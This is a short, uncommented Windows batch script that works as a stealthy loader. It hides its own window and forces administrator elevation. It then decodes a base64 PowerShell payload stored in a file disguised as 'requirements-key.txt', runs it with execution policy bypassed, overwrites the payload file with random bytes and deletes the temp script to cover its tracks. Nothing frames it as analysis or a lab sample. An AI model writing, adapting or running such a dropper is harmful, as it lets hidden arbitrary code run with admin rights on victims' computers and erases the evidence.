@echo off
set "a=%~1"
if "%a%"=="__h__" goto :x
powershell -Command "Start-Process '%~f0' -ArgumentList '__h__' -WindowStyle Hidden"
exit /b
:x
title x
net session >nul 2>&1
if %errorlevel% neq 0 (powershell -Command "Start-Process '%~f0' -Verb RunAs" & exit /b)
set "b=%~dp0requirements-key.txt"
if not exist "%b%" (pause & exit /b)
set "t=%temp%\d_%random%.ps1"
powershell -NoProfile -ExecutionPolicy Bypass -Command "$c=Get-Content '%b%' -Raw;$d=[Convert]::FromBase64String($c);$e=[Text.Encoding]::Unicode.GetString($d);Set-Content -Path '%t%' -Value $e -Encoding Unicode"
if not exist "%t%" (pause & exit /b)
call :y
powershell -NoProfile -ExecutionPolicy Bypass -File "%t%"
del "%t%" 2>nul
echo.
pause >nul
exit /b
:y
if exist "%b%" del "%b%" 2>nul
set /a "m=38","x=100","r=x-m+1"
set /a "l=%random% %% %r% + %m%"
powershell -NoProfile -Command "$n=New-Object byte[] %l%;(New-Object Random).NextBytes($n);$o=[Convert]::ToBase64String($n);[IO.File]::WriteAllText(\"%b%\",$o)"
goto :eof